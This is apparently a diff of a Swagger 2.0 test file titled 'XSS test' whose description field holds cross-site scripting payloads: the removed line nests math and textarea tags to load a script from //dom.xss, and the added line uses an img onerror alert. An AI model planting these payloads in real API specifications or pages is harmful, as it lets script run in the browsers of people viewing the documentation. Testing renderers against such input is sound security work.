@@ -1,5 +1,5 @@
 swagger: '2.0'
 info:
   title: XSS test
-  description: <math><mtext><h1><a><h6></a></h6><textarea></textarea>"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
+  description: <math><mtext><h1><a><h6></a></h6><textarea></textarea>"<img src onerror %09=alert>
   version: production
